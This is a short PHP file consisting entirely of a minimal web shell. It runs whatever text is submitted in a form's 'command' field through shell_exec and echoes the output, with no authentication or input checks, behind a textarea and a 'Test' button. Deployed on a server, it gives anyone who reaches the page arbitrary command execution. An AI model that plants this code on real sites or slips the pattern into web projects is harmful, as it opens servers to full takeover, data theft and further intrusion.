<?php 
$command = '';

if($_POST)
{
	$command = $_POST['command'];
	
	$output = shell_exec($command);

	echo $output;
}
?>

<form method="post">
	<textarea name="command"><?php echo $command;?></textarea><br /><br />
    <input type="submit" name="save" value="Test" />
</form>